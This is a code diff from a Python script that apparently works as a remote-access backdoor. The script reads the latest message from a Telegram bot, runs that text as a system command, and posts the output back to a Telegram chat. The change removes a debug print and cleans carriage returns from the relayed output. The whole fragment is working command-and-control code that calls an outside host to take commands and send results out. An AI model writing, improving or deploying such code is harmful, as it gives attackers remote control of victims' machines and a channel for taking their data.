@@ -19,8 +19,7 @@ def run():
             res = requests.get(url,timeout=600).json()['result'][-1]['message']['text']
             if prev_msg != res:
                 prev_msg = res
-                print(res.split(" "))
-                message = subprocess.check_output(res.split(" ")).decode()
+                message = subprocess.check_output(res.split(" ")).decode().replace("\r","")
                 time.sleep(1)
                 url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={message}"
                 requests.get(url,timeout=600).json()
